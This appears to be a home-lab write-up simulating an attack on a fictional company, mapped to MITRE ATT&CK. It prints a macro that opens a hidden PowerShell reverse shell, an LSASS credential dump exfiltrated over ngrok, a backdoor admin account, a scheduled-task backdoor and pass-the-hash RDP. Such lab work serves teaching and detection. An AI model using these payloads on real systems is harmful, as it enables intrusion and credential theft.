# ☠️ Phase 2: Attack Simulation & Threat Emulation

> ⚠️ **Disclaimer**  
> This lab was executed in a fully isolated, non-production environment owned and controlled by me. The techniques demonstrated are strictly for educational purposes. Do **not** replicate these attacks on any system you do not explicitly own or have written authorization to test.

---

## 🧠 Objective

Simulate a targeted attack against **Wayne Enterprises** to confirm the presence of an **R&D department** and exfiltrate sensitive data. Based on OSINT, the existence of such a department was hypothesized but unconfirmed.  
The attack chain follows these goals:

- Gain initial access  
- Establish persistence  
- Escalate privileges  
- Move laterally  
- Exfiltrate confidential files

---

## 🔁 Cyber Kill Chain Overview

| Phase              | Description                            |
|-------------------|----------------------------------------|
| 1. Reconnaissance | External scanning and OSINT            |
| 2. Weaponization  | Creation of malicious payload          |
| 3. Delivery       | Payload sent via phishing              |
| 4. Exploitation   | Gaining access and dumping credentials |
| 5. Installation   | Creating persistence on host           |
| 6. C2             | Maintaining access, exfiltration       |
| 7. Objectives     | Lateral movement, data theft           |

---

## 🔍 1. Reconnaissance

External scan:

```bash
sudo nmap -Pn -sS -sV -T4 -p 3389,80,22,445,5985 172.203.221.2
```

**Open ports discovered:**
- 3389 (RDP)
- 5985 (WinRM)

**OSINT Results:**
- CEO: Bruce Wayne
- HR Head: Barbara Gordon (found via fake LinkedIn profile)
- Email: `barbaragordonhr1@gmail.com`

Planned infiltration via Barbara's workstation.

📸 **Screenshots:**

*Stealth Nmap scan*

![Stealth Recon Scan](https://github.com/user-attachments/assets/4fbc8dce-4043-4272-89d9-dcdeac406b82)

*LinkedIn OSINT Barbara*
![Recon Barb Manager at Wayne](https://github.com/user-attachments/assets/2c210d1c-31ea-42cc-92ba-064ecba44cc7)

*Discovered email for phishing*

![found the victims email for phishing](https://github.com/user-attachments/assets/d9cdc0da-c963-4ea6-bd0f-6f036dd0e74a)


---

## 🧪 2. Weaponization

Initial brute-force attempts on RDP failed. Switched to phishing.

**Payload:** Malicious `.docm` disguised as HR document with embedded PowerShell reverse shell.

**VBA Macro Payload:**

```vba
Sub AutoOpen()
    Shell "powershell -w hidden -c \"$c=New-Object Net.Sockets.TCPClient('192.168.1.196',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(Invoke-Expression $d 2>&1 | Out-String );$s.Write((New-Object -TypeName System.Text.ASCIIEncoding).GetBytes($r),0,$r.Length)}\"", vbHide
End Sub
```

**Setup Commands:**
```bash
python3 upload_server.py
ngrok http 80
nc -lvnp 4444
```

📸 **Screenshots:**

*Python upload server*
![creating file upload server for NGROK](https://github.com/user-attachments/assets/403ec2f1-547e-4acc-ba88-2d5f8fda88e2)

*Ngrok, Netcat, and Upload Server*
![Ngrok listening, python upload server enabled, and netcat listener for reverse shell](https://github.com/user-attachments/assets/cb37cdda-71c8-4496-9119-d5893f6cf97d)

*Malicous macro embedded in Word Document*
![malicous macro spawning reverse shell on doc open](https://github.com/user-attachments/assets/086c433e-cb44-4412-a9f5-826907686345)

---

## 📦 3. Delivery

- Sent `.docm` to Barbara via phishing email
- Victim opened file, macro executed
- Reverse shell triggered to attacker (Joker VM)

📸 **Screenshots:**

*DOCM file opened on victim machine*
![Malicous docm opened on victim machine](https://github.com/user-attachments/assets/0f9c4442-49f1-4b0b-a3e0-f6badca130e1)

*Macro calls back to revshell.ps1 hosted on upload server*
![macro calls back to revshellps1 on hosted python server](https://github.com/user-attachments/assets/715f4b1d-0144-47f6-899e-8ed2e84c3325)

*Callback to Python server confirmed*
![target machine called back to python server and executed revshell successfully](https://github.com/user-attachments/assets/bd04c91c-f0d3-43f9-8efe-cdf7decd5793)

*Shell connection received*
![connection established](https://github.com/user-attachments/assets/ea1d5b7f-dbc4-4b45-8725-db9fbd1d6884)

---

## 💥 4. Exploitation

**Credential Dump:**
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Temp\lsass.dmp full
```

**Exfiltration:**
```powershell
Invoke-WebRequest -Uri "http://<ngrok_url>/upload" -Method POST -InFile C:\Temp\lsass.dmp
```

**Hash Extraction:**
```bash
pypykatz lsa minidump lsass.dmp
```

📸 **Screenshots:**

*LSASS dump created*
![lsass dump completed](https://github.com/user-attachments/assets/b1a9c06a-6e6d-49fb-8463-0227c93b0b98)

*File exfiltrated*
![lsass dmp file in our posession](https://github.com/user-attachments/assets/05d4c43b-88f6-4c70-9129-2f4c59224837)

*NTLM hash used to pass-the-hash*
![NTLM hash used to pass the hash and RDP](https://github.com/user-attachments/assets/d10ef0a8-849a-4510-b365-ba13f3ebf132)

---

## 🧪 5. Installation (Persistence)

**New User Creation:**
```cmd
net user Joker Pass123 /add
group localgroup administrators Joker /add
```

**Scheduled Task Backdoor:**
```cmd
schtasks /create /tn "Updater" /tr "powershell.exe -w hidden -File C:\Users\Public\revshell.ps1" /sc onlogon /ru SYSTEM
```

📸 **Screenshots:**

*Created admin user*
![creating persistance by creating new user with admin rights](https://github.com/user-attachments/assets/8556d582-78bb-466e-acb9-f9983654485b)

*Backdoor task configured*
![saving reverse shell script on target pc to run as scheduled task on startup as backdoor](https://github.com/user-attachments/assets/961cb01e-0d1c-4d7b-92d7-6e42936bf2ca)
![reverse shell script saved as scheduled task on startup, backdoor installed](https://github.com/user-attachments/assets/67f66438-8865-47ec-bb6f-0910c6b53283)

---

## 🛠️ 6. Command & Control (C2)

We will utilize the extracted DMP file to RDP via pass-the-hash onto the target machine and move laterally to R&D from there.

We have established persistance with a reverse powershell and scheduled task to reconnect the reverse shell on startup, this will ensure that we maintain connectivity to the target at all times. 


---

## ✨ 7. Actions on Objectives

**Pass-the-Hash RDP:**
```bash
xfreerdp /u:Barbara.HR /d:WAYNE /pth:<NTLM_HASH> /v:172.203.221.2
```

**Post-RDP Enumeration:**
```cmd
net user /domain
```

- Identified `Lucious.R&D`
- Accessed his profile and files
- Found and exfiltrated `Batmobile-Schematics.bmp`

📸 **Screenshots:**

*RDP session via NTLM hash*
![after passing the hash and RDP onto barbara we look for other domains and we found Lucious R D](https://github.com/user-attachments/assets/dc33ff0f-4aef-4b15-b95b-d5025edb2882)

Lucious R&D domain identified
![Inside Lucious files](https://github.com/user-attachments/assets/23f9732a-a694-48df-a57f-80233cd0dbb5)
![Found location of sensitive files will now proceed to extract](https://github.com/user-attachments/assets/6c1b703a-df10-401f-8a05-be18afc6b8ee)

File exfiltration complete
![extracting sensitive file to kali via ngrok](https://github.com/user-attachments/assets/541b5000-5916-41c6-9b64-b15735c46ea7)
![file landed in our kali machine](https://github.com/user-attachments/assets/0fe30a72-b634-4777-87aa-6cad8b7e4f0b)

---

## ✅ Phase 2 Complete

A full adversarial simulation was executed successfully from external recon to exfiltration of R&D data. All steps mapped to MITRE ATT&CK and executed in a controlled environment.

---

## 🧰 MITRE ATT&CK Techniques Used

| Technique ID   | Name                                            | Description                          |
|----------------|--------------------------------------------------|--------------------------------------|
| T1566.002      | Spearphishing via Link                          | Phishing w/ malicious document       |
| T1204.002      | User Execution: Malicious File                  | Executed .docm payload               |
| T1059.001      | Command & Scripting Interpreter: PowerShell     | Reverse shell in PowerShell         |
| T1059.003      | Command & Scripting Interpreter: Windows CMD    | Persistence via `cmd`               |
| T1053.005      | Scheduled Task/Job: Scheduled Task              | Created startup backdoor            |
| T1003.001      | OS Credential Dumping: LSASS Memory             | LSASS dump for NTLM hashes          |
| T1021.001      | Remote Services: Remote Desktop Protocol        | RDP for lateral movement            |
| T1078.003      | Valid Accounts: Local Accounts                  | Created new local admin             |
| T1041          | Exfiltration Over C2 Channel                    | Exfil via NGROK                     |
| T1071.001      | Application Layer Protocol: Web Protocols       | HTTP POST for file exfil            |

---

**Next:** _Phase 3 – Log Collection & Data Ingestion_
